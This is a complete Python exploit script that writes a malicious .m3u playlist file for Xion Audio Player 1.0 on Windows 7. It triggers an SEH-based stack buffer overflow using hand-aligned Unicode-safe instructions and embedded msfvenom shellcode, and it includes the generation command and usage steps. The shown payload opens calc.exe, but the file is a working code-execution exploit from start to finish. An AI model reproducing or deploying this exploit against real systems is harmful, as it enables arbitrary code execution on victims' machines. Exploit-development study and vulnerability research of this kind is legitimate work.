#!/usr/bin/env python3

# Exploit file to pop calc.exe for Xion Audio Player Version 1.0 (build 121) on Windows 7.
# How 2 use:
#   Generate the exploit.m3u file by running this script
#   Load the exploit.m3u file into the application
#
# Note: executes shellcode in the stack (SEH-based); does NOT defeat DEP.
# Tested on Windows 7 x64 Ultimate.

filename = "exploit.m3u"

print("Creating '" + filename + "' exploit file...")

# Metasploit generated shellcode to pop calc.exe using `x86/unicode_upper` encoder.
# Command to generate:
#   msfvenom -a x86 --platform windows -p windows/exec CMD=calc -e x86/unicode_upper BufferRegister=EAX -f python
buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x6b\x4c\x39\x58\x52\x62"
buf += "\x59\x70\x39\x70\x69\x70\x53\x30\x34\x49\x4b\x35\x4e"
buf += "\x51\x75\x70\x31\x54\x34\x4b\x62\x30\x6e\x50\x52\x6b"
buf += "\x51\x42\x6c\x4c\x52\x6b\x71\x42\x6c\x54\x62\x6b\x63"
buf += "\x42\x6b\x78\x7a\x6f\x74\x77\x4d\x7a\x4e\x46\x70\x31"
buf += "\x59\x6f\x46\x4c\x4f\x4c\x63\x31\x61\x6c\x49\x72\x4c"
buf += "\x6c\x4d\x50\x37\x51\x36\x6f\x7a\x6d\x5a\x61\x36\x67"
buf += "\x59\x52\x6b\x42\x32\x32\x61\x47\x64\x4b\x71\x42\x6a"
buf += "\x70\x52\x6b\x6f\x5a\x6d\x6c\x42\x6b\x4e\x6c\x6a\x71"
buf += "\x61\x68\x77\x73\x6e\x68\x59\x71\x67\x61\x42\x31\x32"
buf += "\x6b\x70\x59\x6b\x70\x4a\x61\x38\x53\x52\x6b\x51\x39"
buf += "\x4b\x68\x7a\x43\x4e\x5a\x51\x39\x34\x4b\x50\x34\x52"
buf += "\x6b\x7a\x61\x47\x66\x70\x31\x69\x6f\x54\x6c\x55\x71"
buf += "\x38\x4f\x5a\x6d\x79\x71\x55\x77\x6f\x48\x77\x70\x71"
buf += "\x65\x5a\x56\x69\x73\x61\x6d\x4c\x38\x4f\x4b\x51\x6d"
buf += "\x4b\x74\x33\x45\x58\x64\x6f\x68\x72\x6b\x42\x38\x4d"
buf += "\x54\x6b\x51\x4a\x33\x52\x46\x52\x6b\x7a\x6c\x6e\x6b"
buf += "\x62\x6b\x42\x38\x4b\x6c\x6d\x31\x57\x63\x74\x4b\x4a"
buf += "\x64\x52\x6b\x6b\x51\x56\x70\x51\x79\x71\x34\x4f\x34"
buf += "\x4f\x34\x51\x4b\x31\x4b\x33\x31\x42\x39\x6f\x6a\x32"
buf += "\x31\x49\x6f\x79\x50\x4f\x6f\x71\x4f\x6f\x6a\x34\x4b"
buf += "\x4a\x72\x7a\x4b\x42\x6d\x6f\x6d\x52\x4a\x39\x71\x44"
buf += "\x4d\x53\x55\x76\x52\x4d\x30\x79\x70\x6b\x50\x62\x30"
buf += "\x62\x48\x6d\x61\x52\x6b\x42\x4f\x72\x67\x79\x6f\x69"
buf += "\x45\x65\x6b\x6c\x30\x37\x45\x76\x42\x61\x46\x72\x48"
buf += "\x43\x76\x42\x75\x45\x6d\x55\x4d\x59\x6f\x57\x65\x6d"
buf += "\x6c\x49\x76\x33\x4c\x7a\x6a\x45\x30\x79\x6b\x39\x50"
buf += "\x63\x45\x6c\x45\x55\x6b\x51\x37\x4a\x73\x42\x52\x70"
buf += "\x6f\x50\x6a\x39\x70\x62\x33\x49\x6f\x69\x45\x32\x43"
buf += "\x61\x51\x72\x4c\x32\x43\x6d\x30\x41\x41"

exploit = "A"*270                   # Padding
exploit += "\x42\x6D"               # Next SEH (nop/align):
                                    # `inc edx`
                                    # `add byte ptr ss:[ebp], ch`
exploit += "\x15\x45"               # SEH points to pop pop ret in executable module
exploit += "\xCC"                   # Padding
                                    # `adc eax, 0xCC004500`
exploit += "\x6D"                   # nop/align
exploit += "\x54"                   # `push esp`
exploit += "\x6D"                   # nop/align
exploit += "\x58"                   # `pop eax`
exploit += "\x6D"                   # nop/align
exploit += "\x05\x41\x41"           # `add eax, 0x41004100`
exploit += "\x6D"                   # nop/align
exploit += "\x2D\x21\x41"           # `sub eax, 0x41002100`
exploit += "\x6D"                   # nop/align
exploit += "\x50"                   # `push eax`
exploit += "\x6D"                   # nop/align
exploit += "\xC3"                   # `ret`
exploit += "\x90"*433               # Padding
exploit += buf                      # Shellcode
exploit += "\xCC"*(1976-len(buf))   # Generate exception by writing past the stack
                                    # The padding size must be adjusted so that the
                                    # SEH overwrite is aligned properly

with open(filename, "wb") as f:
    f.write(exploit.encode('iso8859-1'))

print("exploit file '" + filename + "' created!")